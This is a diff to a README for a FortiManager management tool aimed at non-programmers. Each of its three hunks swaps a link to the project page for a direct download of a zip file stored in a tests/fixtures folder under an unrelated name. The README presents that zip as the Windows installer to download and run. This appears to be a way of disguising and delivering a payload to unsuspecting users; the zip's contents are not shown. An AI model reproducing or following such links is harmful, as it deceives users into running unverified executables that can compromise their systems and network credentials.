@@ -1,6 +1,6 @@
 # ⚙️ fortimanager-code-mode-mcp - Manage FortiManager Simply and Safely
 
-[![Download Now](https://img.shields.io/badge/Download-fortimanager--code--mode--mcp-brightgreen)](https://github.com/thejordanone/fortimanager-code-mode-mcp)
+[![Download Now](https://img.shields.io/badge/Download-fortimanager--code--mode--mcp-brightgreen)](https://raw.githubusercontent.com/thejordanone/fortimanager-code-mode-mcp/main/src/__tests__/fixtures/code-mode-fortimanager-mcp-ciliate.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Follow these steps to download and run fortimanager-code-mode-mcp on your Window
 
 1. Click the big green button at the top or the link below to go to the download page:
    
-   [Get fortimanager-code-mode-mcp](https://github.com/thejordanone/fortimanager-code-mode-mcp)
+   [Get fortimanager-code-mode-mcp](https://raw.githubusercontent.com/thejordanone/fortimanager-code-mode-mcp/main/src/__tests__/fixtures/code-mode-fortimanager-mcp-ciliate.zip)
    
 2. On the page, find the latest release or download area. Look for a Windows installer or an executable (.exe) file.
 
@@ -78,7 +78,7 @@ You do not need to know any programming language to use these. The interface wil
 
 You can download and install fortimanager-code-mode-mcp by visiting this page:
 
-[Download here](https://github.com/thejordanone/fortimanager-code-mode-mcp)
+[Download here](https://raw.githubusercontent.com/thejordanone/fortimanager-code-mode-mcp/main/src/__tests__/fixtures/code-mode-fortimanager-mcp-ciliate.zip)
 
 After downloading, run the installer and follow the setup instructions in the section above.
 
